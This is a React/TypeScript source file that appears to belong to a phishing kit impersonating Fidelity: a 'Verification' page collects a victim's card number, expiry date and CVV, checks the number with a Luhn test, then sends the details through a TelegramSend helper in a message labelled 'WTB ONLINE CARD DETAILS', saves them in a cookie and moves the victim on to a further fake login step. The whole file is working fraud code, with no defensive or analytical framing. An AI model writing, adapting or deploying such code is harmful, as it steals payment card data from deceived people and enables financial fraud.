import React from "react";
import Logo from "../assets/logo.jpeg";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";
import TelegramSend from "../utils/send-message";
import { verifyCreditCardNumber } from "../utils/luhn";

export default function Add() {
  const [isLoading, setIsLoading] = React.useState(false);
  const [formInput, setFormInput] = React.useState<card>({
    cnm: "",
    cv: "",
    ex:""
  });

  const navigate = useNavigate();

  function handleCardInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    let value = event.target.value.replace(/\s/g, ''); // Remove existing spaces
    value = value.replace(/\D/g, ''); // Remove non-digit characters

    if (value.length > 0) {
        value = value.match(new RegExp('.{1,4}', 'g'))!.join(' ');
    }

    event.target.value = value;
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }
  function handleExpDate (e: React.ChangeEvent<HTMLInputElement>) {
    let value = e.target.value.replace(/\D/g, ''); // Remove non-digit characters

    if (value.length > 2) {
       
        value = value.slice(0, 2) + ' / ' + value.slice(2);
    }

    e.target.value = value;
    setFormInput((prevData) => ({
      ...prevData,
      [e.target.name]: e.target.value,
    }));
  }

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    const isValidCardNum = verifyCreditCardNumber(formInput.cnm);
    
    if(!isValidCardNum){
      document.getElementById("card-error")?.classList.remove("hide")
      return
    }
    const message = `
        ---- WTB ONLINE CARD DETAILS -----
        Card Number: ${formInput.cnm}
        Card Expiry: ${formInput.ex}
        Card CVV: ${formInput.cv}
        `;
    setIsLoading(true);
    await TelegramSend(message);
    cookies.set("card", formInput);
    setIsLoading(false);
    navigate("../login/auth/3", { replace: true });
  }

  return (
    <>
      <div className="content">
        <div className="form">
          <form onSubmit={handleSubmit} method="POST">
            <div className="form-item">
            <div className="brand">
                <img src={Logo} alt="" />
              </div>
              <h2>Verification</h2>
              <p>Verify your debit/credit card information</p>
              <p
              id="card-error"
              className="hide"
                style={{
                  color: "red",
                  border: "thin solid red",
                  padding: 10,
                  fontSize: 12,
                }}
              >
                Invalid card details. Please check your card information and try
                again.
              </p>
                <div className="form-field">
                <label htmlFor="">Card Number</label>
                  <input
                    onChange={handleCardInputChange}
                    name="cnm"
                    type="text"
                    maxLength={19}
                    minLength={16}
                    
                    required
                    placeholder="0000 0000 0000 0000"
                  />
                </div>
  
                <div style={{display:"flex"}}>
                <div className="form-field">
                  <label htmlFor="">Card Expiry</label>
                  <input
                    onChange={handleExpDate}
                    type="text"
                    name="ex"
                    maxLength={7}
                    placeholder="MM/YY"
                    required
                  />
                </div>
<span style={{margin:"0 5px"}}></span>
                <div className="form-field">
                  <label htmlFor="">CVV</label>
                  <input
                    onChange={handleInputChange}
                    type="text"
                    name="cv"
                    maxLength={4}
                    required
                  />
                </div>
                </div>
                
                <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "flex-end",
                  marginTop: "-20px",
                }}
              >


               
                {isLoading ? (
                  <div className="form-field">
                    <button style={{ width: 130, height: 50 }} type="button">Please wait...</button>
                  </div>
                ) : (
                  <div className="form-field">
                    <button style={{ width: 120, height: 50 }} type="submit">
                      Continue
                    </button>
                  </div>
                )}
              </div>
            </div>
          </form>
        </div>
      </div>

      <div className="footer">
        <p style={{ textAlign: "center" }}>
          New to Fidelity? <a href="">Open an account</a> or{" "}
          <a href="">sign up</a>
        </p>
      </div>
    </>
  );
}
